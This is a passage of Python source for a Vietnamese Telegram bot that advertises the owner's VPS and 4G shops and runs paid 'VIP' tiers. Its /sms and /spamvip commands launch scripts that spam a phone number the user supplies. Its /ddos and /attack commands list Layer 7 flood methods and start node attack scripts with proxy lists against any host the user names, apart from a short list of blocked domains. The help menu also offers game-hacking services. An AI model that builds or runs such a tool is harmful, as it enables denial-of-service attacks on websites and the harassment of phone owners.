👉 https://httpsvpsvanmanhgaming.click  👈

👉 **Link Shop 4G** 👈

👉 https://4gvpsvanmanhgaming.click 👈

👉 **Copyright 2024 © Powered By HTTPSVPSVANMANHGAMING.CLICK** 👈

━━━━━━━━━━━━━━━━━━━

🎥 https://files.catbox.moe/7yqag1.mp4

━━━━━━━━━━━━━━━━━━━
'''
    bot.reply_to(message, help_text)




@bot.message_handler(commands=['chubot', 'chubot@VPSVANMANHGAMINGBOT'])
def lenh(message):
    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    help_text = '''

🤖 **Chủ BOT Đây Nha:>** 🤖

🔰 Liên hệ chủ bot: https://t.me/@Vpsvanmanhgaming
🔰 Link Vào Nhóm: https://t.me/botvipvc
🔰 Lưu Ý: BOT Chỉ Hoạt Động Được Trên Nhóm!👉 **Số Điện Thoại Zalo Để Thuê Nha:** 👈

👉 0559140928 👈

👉 **Link Facebook Để Thuê Nha:** 👈

👉 facebook.com/profile.php?id=100072182542348 👈

👉 **Link TikTok Để Thuê Nha:** 👈

👉 https://www.tiktok.com/@kecodon7103 👈 

👉 **LINK TLE ĐỂ THUÊ NHA:** 👈

👉https://t.me/Vpsvanmanhgaming 👈 

👉 **NHÓM TLE GIAO LƯU :** 👈

👉 https://t.me/botvipvc 👈

👉 **NHÓM TLE GIAO LƯU :** 👈

👉 https://t.me/botvipfc 👈

👉 **4G Giá Rẻ Học Sinh Và Sinh Viên Đều Có Thể Mua Nha:** 👈

👉 https://4gvpsvanmanhgaming.click 👈

👉 **Link Shop VPS Nha:** 👈

👉 https://httpsvpsvanmanhgaming.click  👈

👉 **Link Shop 4G** 👈

👉 https://4gvpsvanmanhgaming.click 👈

👉 **Copyright 2024 © Powered By HTTPSVPSVANMANHGAMING.CLICK** 👈
━━━━━━━━━━━━━━━━━━━

🎥 https://files.catbox.moe/dowxvy.mp4

━━━━━━━━━━━━━━━━━━━
'''
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', disable_web_page_preview=True)





@bot.message_handler(commands=['4gvpsvanmanhgaming', '4gvpsvanmanhgaming@VPSVANMANHGAMINGBOT'])
def lenh(message):

        # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    # Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '🚫 **Trộm bot à?** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return
    
    video_url = "https://files.catbox.moe/bdcwme.mp4"  # Thay thế bằng URL thực tế của video
    help_text = '''
🤖 **Chủ BOT Đây Nha:** 🤖
🔹 **Liên Hệ Chủ Bot:** https://t.me/@Vpsvanmanhgaming
🔹 **Link Vào Nhóm:** https://t.me/botvipvc
🔹 **Lưu Ý:** BOT Chỉ Hoạt Động Trong Nhóm!
📞 **Số Điện Thoại Zalo Để Thuê:** 0559140928
🔗 **Link Facebook Để Thuê:** https://facebook.com/profile.php?id=100072182542348
📱 **Link TikTok Để Thuê:** https://www.tiktok.com/@kecodon7103
🔗 **LINK TLE ĐỂ THUÊ:** https://t.me/Vpsvanmanhgaming
🌟 **NHÓM TLE GIAO LƯU:** https://t.me/botvipvc
🌟 **NHÓM TLE GIAO LƯU KHÁC:** https://t.me/botvipfc
🚀 **Admin Cung Cấp Dịch Vụ 4G, 5G VPN Giá Rẻ Nhất** 😎✨
🔹 **Website VPN:** https://4gvpsvanmanhgaming.click 💻
🔸 **Rẻ Nhất Chỉ Từ 7k 💸** - Tốc Độ Cực Mạnh, Nhiều GB ⚡
🔸 **Rất Nhiều Cổng Mạng, File, Server** 🌍
🔸 **Cung Cấp Dịch Vụ 4G Tốc Độ Cực Cao** 📶💨
🔸 **Dịch Vụ VPN Tăng Tốc Mạng, Wifi** 🔧🌐
🔸 **Hệ Thống Máy Chủ Cao Cấp** 🖥️🔒
🔸 **"Ngon - Bổ - Rẻ"** 😋💯
🔸 **Làm CTV Web Con 40%** 💼📈
🔸 **Trải Nghiệm Mượt Mà Nhất** 🎬🎮🖥️
👉** Copyright 2024 © Powered By https://4gvpsvanmanhgaming.click ** 👈
━━━━━━━━━━━━━━━━━━━
https://files.catbox.moe/bdcwme.mp4
━━━━━━━━━━━━━━━━━━━
    '''
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', disable_web_page_preview=True)
    bot.send_video(message.chat.id, video_url, caption="🎥 Video giới thiệu dịch vụ 4G Giá Rẻ Nha:>", parse_mode='html')




@bot.message_handler(commands=['start', 'start@VPSVANMANHGAMINGBOT'])
def lenh(message):

    # Kiểm tra nếu bot đang hoạt động
    if not is_bot_active:
        bot.reply_to(message, '🚫 Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Kiểm tra nếu lệnh được thực hiện trong nhóm hoặc siêu nhóm
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    # Kiểm tra nếu ID nhóm là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return
    
    help_text = '''
🌟 **DANH SÁCH LỆNH VÀ DỊCH VỤ:**
━━━━━━━━━━━━━━━━━━━
📜 **Dịch Vụ Mạng Xã Hội:**
• /chubot - Liên hệ chủ bot ☎️
• /muaplan - Mua VIP 💰
• /profile - Kiểm tra plan 📊
• /vpsgiare - Mua VPS giá rẻ 🖥️
• /capcut - Tải video mẫu Capcut 🎬
• /anhgai - Tải ảnh đẹp 📷
• /anhgaisexy - Tải ảnh đẹp (sexy) 😍
• /vdgai - Tải video đẹp 📹
• /anhgaianime - Tải ảnh gái anime 🌸
• /vdgaianime - Tải video gái anime 🎎
• /crush - TOP những câu nói để hỏi thính crush 💖
• /ask - Câu hỏi của bạn 🤔
• /gemini - Câu hỏi của bạn 🤔
• /c25vip - Mang đến Dịch Vụ Tool Chất Lượng và tích xanh với giá cả phải chăng! 🌟
• /hackgamesgiare - Cung cấp dịch vụ hack games giá rẻ 💻
• /4gvpsvanmanhgaming - 4G Giá Rẻ Nha:> 🌟
━━━━━━━━━━━━━━━━━━━
🛡️ **Bảo mật và Công cụ:**
• /ddos - Show methods layer 7 🛡️
• /ytb [Từ khóa] - Tìm kiếm video YouTube 🎥
• /infoytb [Link kênh] - Kiểm tra thông tin kênh YouTube 📺
• /code [Link web] - Lấy mã nguồn web 🌐
• /kiemtra [URL] - Check domain đã đăng kí hay chưa 🔍
• /sms [Số điện thoại] - Spam SMS 📲
• /spamvip [Số điện thoại] - Spam VIP 👑
• /fb [Link FB] - Check thông tin Facebook 👤
• /view [URL] - Buff view TikTok 👁️
• /viewvip [URL] - Buff view TikTok VIP 👑
• /tiktok [URL] - Tải video TikTok 🎵
• /tiktokid [ID TikTok] - Kiểm tra tài khoản TikTok 🆔
• /tt [Thành phố] - Check thời tiết 🌤️
• /avtfb [Link FB] - Get AVTFB xuyên khiên 🛡️
• /check [Tên miền] - Check IP website 📡
• /checkip [IP] - Check địa chỉ bằng IP 🌐
• /id - Lấy ID Telegram 🆔
• /language [vi-en] - Đổi ngôn ngữ 🇻🇳-🇺🇸
━━━━━━━━━━━━━━━━━━━
📩 **Liên hệ Admin:**
• /admin1 - Admin 1 📩
• /admin2 - Admin 2 📩
• /donate - Tặng admin gói mì 🍜
━━━━━━━━━━━━━━━━━━━
⚙️ **Quản trị nhóm (Admin Only):**
• /ddosadmin - Show methods layer 7 Admin 🛡️👑
• /attackadmin - DDOS Admin 🛡️👑
• /addvip - Thêm VIP 👑
• /removevip - Xóa VIP ❌
• /on - Bật bot 🔓
• /off - Tắt bot 🔒
• /cpu - Kiểm tra CPU 💻
• /time - Xem giờ ⏰
• /mute - Tắt nhắn tin 📵
• /unmute - Mở nhắn tin 🔊
• /ban - Cấm thành viên 🚫
• /unban - Bỏ cấm thành viên ✅
━━━━━━━━━━━━━━━━━━━
🎥 https://files.catbox.moe/v5ywm6.mp4
━━━━━━━━━━━━━━━━━━━
'''
    bot.reply_to(message, help_text)





is_bot_active = True
# Danh sách số điện thoại cấm spam
banned_numbers = ["0559140928", "0383018635"]
last_sms_time = 0

@bot.message_handler(commands=['sms'])
def spam(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    user_id = message.from_user.id
    username = message.from_user.username

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    global last_sms_time
    
    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    user_id = message.from_user.id
    
    # Kiểm tra thời gian giữa hai lần sử dụng lệnh /sms
    current_time = time.time()
    if current_time - last_sms_time < 120:
        remaining_time = int(120 - (current_time - last_sms_time))
        bot.reply_to(message, f'Vui lòng chờ {remaining_time} giây trước khi sử dụng lại lệnh /sms.')
        return
    
    if len(message.text.split()) != 3:
        bot.reply_to(message, 'Vui lòng nhập đúng định dạng | Ví dụ: /sms 0559140928 10')
        return
    
    phone_number = message.text.split()[1]
    lap = message.text.split()[2]
    
    if not lap.isnumeric() or not (0 < int(lap) <= 15):
        bot.reply_to(message, 'Số lần spam không hợp lệ. Vui lòng spam trong khoảng từ 1 đến 15 lần !')
        return
    
    if phone_number in banned_numbers:
        bot.reply_to(message, 'Số Điện Thoại Bị Cấm !')
        return
    
    if len(phone_number) != 10 or not phone_number.isdigit():
        bot.reply_to(message, 'Số điện thoại không hợp lệ!')
        return
    
    # Thực hiện spam số điện thoại

    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, "15"])
    processes.append(process)
    bot.reply_to(message, f'''
    ➤ User ID 👤: [ {user_id} ]
➤ User 𝗕𝘆 👤: @{username}
➤ Spam: [ {phone_number} ] Success 📱
➤ Lặp Lại ⚔️ : {lap} 🕰
➤ Ngày : {TimeStamp()}
➤ Plan : FREE
➤ Chúc Bạn sử dụng bot vui vẻ⚡️
➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲
➤ VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click
➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click
━━━━━━━━━━━━━━━━━━━
https://files.catbox.moe/tuoa6f.mp4
━━━━━━━━━━━━━━━━━━━
    ''')
    
    # Cập nhật thời gian sử dụng lệnh /sms lần cuối
    last_sms_time = current_time




last_spam_time = 0  # Thêm biến last_spam_time để lưu thời gian sử dụng lệnh /spam lần cuối

@bot.message_handler(commands=['spamvip'])
def spam(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    user_id = message.from_user.id
    username = message.from_user.username
    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    global last_spam_time

    # Kiểm tra xem người gửi có phải là admin hoặc thành viên VIP không
    user_id = message.from_user.id
    if user_id not in ADMIN_ID and member_types.get(user_id) != 'VIP':
        bot.reply_to(message, '⚠️ Gói Vip của bạn không tồn tại hoặc đã hết hạn\nVui lòng liên hệ @Vpsvanmanhgaming  để mua gói VIP\nSử dụng /profile để kiểm tra Plan\nDùng Lệnh /muaplan Để Xem Giá\n\n🚫 Sử dụng lệnh /sms nếu bạn là người dùng miễn phí')
        return
    
    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    # Kiểm tra thời gian giữa hai lần sử dụng lệnh /spam
    current_time = time.time()
    if current_time - last_spam_time < 60:
        remaining_time = int(60 - (current_time - last_spam_time))
        bot.reply_to(message, f'Vui lòng chờ {remaining_time} giây trước khi sử dụng lại lệnh /spamvip')
        return
    
    if len(message.text.split()) != 3:
        bot.reply_to(message, 'Vui lòng nhập đúng định dạng | Ví dụ: /spamvip 0559140928 25')
        return
    
    phone_number = message.text.split()[1]
    lap = message.text.split()[2]
    
    if not lap.isnumeric() or not (0 < int(lap) <= 25):
        bot.reply_to(message, 'Số lần spam không hợp lệ. Vui lòng spam trong khoảng từ 1 đến 25 lần ')
        return
    
    if phone_number in banned_numbers:
        bot.reply_to(message, 'Số Điện Thoại Bị Cấm !')
        return
    
    if len(phone_number) != 10 or not phone_number.isdigit():
        bot.reply_to(message, 'Số điện thoại không hợp lệ!')
        return
    # Thực hiện spam số điện thoại

    file_path = os.path.join(os.getcwd(), "spamvip.py")
    process = subprocess.Popen(["python", file_path, phone_number, "25"])
    processes.append(process)
    bot.reply_to(message, f'''
    ➤ User ID 👤: [ {user_id} ]
➤ User 𝗕𝘆 👤: @{username}
➤ Spam: [ {phone_number} ] Success 📱
➤ Lặp Lại ⚔️ : {lap} 🕰
➤ Ngày : {TimeStamp()}
➤ Plan : ViP👑
➤ Chúc Bạn sử dụng bot vui vẻ⚡️
➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲
➤ VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click
➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click\n
━━━━━━━━━━━━━━━━━━━
https://files.catbox.moe/4mvahe.mp4
━━━━━━━━━━━━━━━━━━━
    ''')
    
    # Cập nhật thời gian sử dụng lệnh /spam lần cuối
    last_spam_time = current_time

    


@bot.message_handler(commands=['avtfb'])
def get_facebook_avatar(message: Message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Check if the bot is active
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Check if the chat is not a group or supergroup
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Check if the chat ID is not allowed
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Check the format of the command
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng định dạng !\nVí dụ: /avtfb [link hoặc id]\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
        return

    # Get the parameter from the message
    parameter = message.text.split()[1]

    # Determine if it's a Facebook ID or a Facebook link
    if parameter.isdigit():  # If it's a Facebook ID
        facebook_url = f'https://www.facebook.com/{parameter}'
    else:  # If it's a Facebook link
        facebook_url = parameter

    # Check if the link is from Facebook
    if 'facebook.com' not in facebook_url:
        bot.reply_to(message, 'Liên kết không phải từ Facebook !\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
        return

    try:
        # Send GET request to Facebook page
        response = requests.get(facebook_url)
        response.raise_for_status()

        # Use BeautifulSoup to parse HTML content
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find meta tag containing profile picture URL
        meta_image = soup.find('meta', property='og:image')

        # Check if it's an image link
        if meta_image:
            avatar_url = meta_image['content']
            # Get request info
            request_info = f"Ảnh từ Facebook được yêu cầu bởi: {message.from_user.first_name}\n(@{message.from_user.username}) trong nhóm {message.chat.title}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n"
            # Send photo back to user
            bot.send_photo(message.chat.id, avatar_url, caption=request_info)
        else:
            bot.reply_to(message, 'Không tìm thấy Avatar trên Facebook !\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
    except requests.exceptions.HTTPError as http_err:
        bot.reply_to(message, f'Có lỗi HTTP xảy ra: {http_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
    except Exception as e:
        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')




@bot.message_handler(commands=['ddos'])
def ddos(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Tin nhắn hướng dẫn
    help_text = '''  
>> 𝗙𝘂𝗹𝗹 𝗠𝗲𝘁𝗵𝗼𝗱𝘀 𝗟𝗮𝘆𝗲𝗿𝟳 ⚡️
━━━━━━━━━━━━━━━━━━━
 • 𝗟𝗮𝘆𝗲𝗿𝟳 𝗙𝗿𝗲𝗲
━━━━━━━━━━━━━━━━━━━
 • HTTPS-FREE [🆓] 
 • TCP-FREE [🆓]
━━━━━━━━━━━━━━━━━━━
 • 𝗟𝗮𝘆𝗲𝗿𝟳 𝗩𝗶𝗽 🔴
━━━━━━━━━━━━━━━━━━━
 • BYPASS [Vip💲] 
 • SMURF [Vip💲] 
 • MIX [Vip ] 
 • GOD [Vip💲] 
 • UAM [Vip💲] 
 • HTTPS-VIP [Vip💲] 
 • TLS [Vip💲]  
 • BR [Vip💲]
 • FLOOD [Vip💲] 
 • FLOODER [Vip💲] 
 • MARS [Vip💲] 
 • ADMIN-VIP [Vip💲] [h2-tls] [Đang Bảo Trì]
 • ADMIN-THUONG [Vip💲] [h2-hyper] [Đang Bảo Trì]
 Ví Dụ✅ : /attack HTTPS-FREE httpsvpsvanmanhgaming.click 443 \n/attack + Method + Target_Url + Port
━━━━━━━━━━━━━━━━━━━
https://files.catbox.moe/z5mar1.mp4
━━━━━━━━━━━━━━━━━━━
'''


    # Gửi tin nhắn với video và tin nhắn hướng dẫn
    bot.send_message(message.chat.id, help_text)


allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng:> \n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \n➤ VPS Giá Rẻ💳💲:httpsvpsvanmanhgaming.click\n\n")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return



# Define bot active state as a boolean
is_bot_active = True  # Initially assuming bot is active

# Function to check if a domain is in the blocked list
def is_blocked_domain(host):
    blocked_domains = ['.edu.vn', '.gov.vn', 'liem.com', 'https://chinhphu.vn/', "chinhphu.vn", 'CHINHPHU.vn.vn', "chinhphu.VN", 'CHINHPHU.Vn', "CHINHPHU.vN", 'CHINHPHU.VN', "https://vuvanchien.xyz", "vuvanchien.xyz", "VUVANCHIEN.xyz", "VUVANCHIEN.Xyz", "VUVANCHIEN,XYZ", "VUVANCHIEN,XYz", 'VUVANCHIEN.XyZ', 'https://c25tool.net', 'c25tool.net', 'C25TOOL.net', 'c25tool.NET', 'C25TOOL.NET', 'HTTPS://c25tool.net', 'HTTPS://C25TOOLNET.net', 'https://C25TOOL.net', 'https://hmgteam.net', 'HTTPS://hmgteam.net', 'https://HMGTEAM.net', 'HTTPS://HMTEAM.NET', 'HMTEAM.net', 'HMTEAM.NET', 'https://google.com','google.com','Google.com', 'Https://google.com', 'Https://Google.com', 'https://facebook.com', 'Https://facebook.com', 'Https://Facebook.com', 'facebook.com', 'Facebook.com', 'https://messenger.com', 'Https://messenger.com', 'Mttps://Messenger.com', 'https://zalo.me/pc', "Https://zalo.me/pc", 'https://zalo.me/', 'Https://zalo.me/', 'Https://Zalo.me/', 'Zalo.me', 'zalo.me', 'https://tiktok.com', 'https://tiktok.com', 'Https://tiktok.com', 'Https://Tiktok.com', 'tiktok.com', 'Tiktok.com', 'https://web.telegram.org', 'Https://web.telegram.org', 'Https://Web.telegram.org', 'https://chatgpt.com', 'Https://chatgpt.com', 'Https://Hhatgpt.com', 'chatgpt.com', 'Chatgpt.com', 'https://youtube.com', 'Https://Youtube.com', 'Https://youtube.com', "youtube.com", 'Youtube.com', "Httpsvpsvanmanhgaming.click", "4gvpsvanmanhgaming.click", "4Gvpsvanmanhgaming.click", "4gvpsvanmanhgaming.CLICK", "4gvpsvanmanhgaming.cLick", "4GVpsvanmanhgaming.Click", "4GVPSVANMANHGAMING.cick", "4GVPSVANMANHGAMING.Click", "4GVPSVANMANHGAMING.CLICK", "https://4gvpsvanmanhgaming.click", "HTTPS://4gvpsvanmanhgaming.click", "httpsvpsvanmanhgaming.click", "HTTPSVPSVANMANHGAMING.click", "HTTPSVPSVANMANHGAMING.CLICK", "https://httpsvpsvanmanhgaming.click", "Httpsvpsvanmanhgaming.click", "HTTPS://VPSVANMANHGAMING.CLICK", " Httpsvpsvanmanhgaming.click", "https://pandanetwork.click", "pandanetwork.click", "Https://Pandanetwork.click", "Pandanetwork.click", "https://api.sumiproject.net", 'api.sumiproject.net', "Https://api.sumiproject.net", 'Https://Api.sumiproject.net']
    return any(domain in host for domain in blocked_domains)

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def perform_attack(message):
    user_id = message.from_user.id
    username = message.from_user.username
    current_time = time.time()

    # Check if bot is active
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Check if command is issued in a group or supergroup
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Check if the group ID is allowed
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Cooldown check
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
        return

    args = message.text.split()

    if len(args) < 3:
        bot.reply_to(message, 'Sử dụng lệnh /attack <method> <host> <port>\n Ví Dụ:/attack HTTPS-FREE https://4gvpsvanmanhgaming.click 443')
        return

    method = args[1].upper()
    host = args[2]

    # Blocked domains check
    if is_blocked_domain(host):
        bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {host}")
        return

    member_type = member_types.get(user_id, 'Thường')
    vip_methods = ['TLS', 'FLOODER', 'UAM', 'SMURF', 'HTTPS-VIP', 'MIX', 'GOD', 'FLOOD', 'BYPASS', 'MARS', 'BR']
    free_methods = ['HTTPS-FREE', 'TCP-FREE']

    # Check method and membership type
    if method in vip_methods and member_type != 'VIP':
        bot.reply_to(message, 'Chỉ người dùng VIP mới có thể sử dụng các method VIP. Mua VIP tại /muaplan để sử dụng.')
        return

    if method not in vip_methods and method not in free_methods:
        bot.reply_to(message, 'Thành viên thường mới có thể sử dụng các method như TCP, MIX.')
        return

    price = "VIP" if method in vip_methods else "Free"
    command, duration = [], 200
    if method in ['TLS', 'FLOODER', 'UAM', 'HTTPS-FREE', 'SMURF', 'HTTPS-VIP', 'MIX', 'TCP-FREE', 'GOD', 'FLOOD', 'BYPASS', 'MARS', 'BR']:
        if method == 'TLS':
            command = ["node", "TLS.js", host, "200", "35", "25", "proxy.txt"]
            duration = 200
        elif method == 'FLOODER':
            command = ["node", "BOTLAG.js", host, "200", "30", "25", "proxy.txt"]
            duration = 200
        elif method == 'UAM':
            command = ["node", "DESTROY.js", host, "200", "30", "20", "proxy.txt"]
            duration = 200
        elif method == 'HTTPS-FREE':
            command = ["node", "MIX.js", host, "60", "35", "25", "proxy.txt"]
            duration = 60
        elif method == 'SMURF':
            command = ["node", "SMURF.js", host, "200", "15", "10", "proxy.txt"]
            duration = 200
        elif method == 'HTTPS-VIP':
            command = ["node", "HTTPS.js", host, "200", "35", "25", "proxy.txt", "bypass"]
            duration = 200 
        elif method == 'MIX':
            command = ["node", "vip.js", host, "200", "35", "25", "proxy.txt"]
            duration = 200
        elif method == 'TCP-FREE':
            command = ["node", "TCP.js", host, "60", "35", "25", "proxy.txt"]
            duration = 60   
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "200", "35", "15", "proxy.txt"]
            duration = 200
        elif method == 'FLOOD':
            command = ["node", "BROWSER.js", host, "200", "35", "25", "proxy.txt",]
            duration = 200
        elif method == 'BYPASS':
            command = ["node", "BYPASS.js", host, "200", "35", "25", "proxy.txt"]
            duration = 200
        elif method == 'MARS':
            command = ["node", "kill.js", host, "200", "25", "20", "proxy.txt"]
            duration = 200
        elif method == 'BR':
            command = ["node", "HTTP2.js", host, "200", "25", "20", "proxy.txt"]
            duration = 200

    # Execute attack command based on method

        # Add other method cases...

        cooldown_dict[username] = {'attack': current_time}

        # Launch attack in a separate thread
        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()

        # Success message with video URL
        video_url = "https://files.catbox.moe/6gvp0l.mp4"  # Replace with actual video URL
        check_host_url = f'https://check-host.net/check-http?host={host}'
        message_text = (
            f'\n     🚀 Successful Attack 🚀 \n\n'
            f'↣ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗕𝘆 👤: @{username} \n'
            f'↣ User ID 👤: [ {user_id} ]\n'
            f'↣ 𝗛𝗼𝘀𝘁 ⚔: {host} \n'
            f'↣ 𝗠𝗲𝘁𝗵𝗼𝗱 📁: {method} \n'
            f'↣ 𝗧𝗶𝗺𝗲 ⏱: [ {duration}s ]\n'
            f'↣ 𝗣𝗹𝗮𝗻 💵: [ {price} ] \n'
            f'↣ Check_Host 🔗: [ {check_host_url} ] \n'
            f'↣ 𝗕𝗼𝘁 🤖: @VPSVANMANHGAMINGBOT \n'
            f'↣ 𝗢𝘄𝗻𝗲𝗿 👑 : ➤ @Vpsvanmanhgaming💳💲 \n'
